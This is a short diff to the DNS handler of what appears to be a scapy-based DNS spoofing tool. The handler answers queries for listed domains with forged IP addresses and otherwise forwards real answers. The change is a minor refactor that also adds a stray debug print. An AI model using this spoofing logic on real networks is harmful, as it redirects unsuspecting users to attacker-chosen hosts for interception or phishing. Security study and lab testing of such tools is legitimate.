@@ -194,11 +194,12 @@ class DnsHandler(object):
         if DNS in pkt and pkt[DNS].qd:
             query_name = pkt[DNS].qd.qname.decode()
 
-            for domain, fake_ip in self.spoof_dict.items():
+            for domain in self.spoof_dict:
+                print(domain)
                 if domain in query_name:
-                    response = self.get_spoofed_dns_response(pkt, fake_ip)
+                    response = self.get_spoofed_dns_response(pkt, self.spoof_dict[domain])
                     scapy.send(response, verbose=False)
-                    return f"Spoofed DNS response for {query_name} with IP {fake_ip}"
+                    return f"Spoofed DNS response for {query_name} with IP {self.spoof_dict[domain]}"
 
             response = self.get_real_dns_response(pkt)
             scapy.send(response, verbose=False)
